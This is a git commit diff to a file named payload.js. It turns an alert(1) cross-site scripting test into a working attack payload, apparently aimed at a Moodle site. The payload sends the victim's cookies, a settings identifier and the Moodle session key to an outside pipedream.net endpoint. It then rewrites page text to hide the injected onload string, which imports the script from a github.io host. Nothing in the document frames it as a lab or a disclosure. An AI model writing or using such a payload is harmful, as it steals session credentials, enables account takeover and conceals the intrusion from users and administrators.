0de65841be9d1987967d1a51e9365779ee310f3d
NZRXHX <hachimi.nizar.etu@gmail.com>
2025-12-14 23:08:38 +0100

    Replace alert with fetch and modify text nodes
    Replaced alert with fetch call and added a script to modify text nodes containing a specific target string.

--- payload.js
+++ payload.js
@@ -1,1 +1,18 @@
-alert(1);
+fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param')+"&sesskey="+M.cfg.sesskey);
+(() => {
+  const target = `Nizar "onload="import('//nzrxhx.github.io/payloads/payload.js')`;
+
+  const walker = document.createTreeWalker(
+    document.body,
+    NodeFilter.SHOW_TEXT,
+    null
+  );
+
+  let node;
+  while ((node = walker.nextNode())) {
+    if (node.nodeValue.includes(target)) {
+      node.nodeValue = node.nodeValue.replace(target, 'XYZ');
+    }
+  }
+})();
+
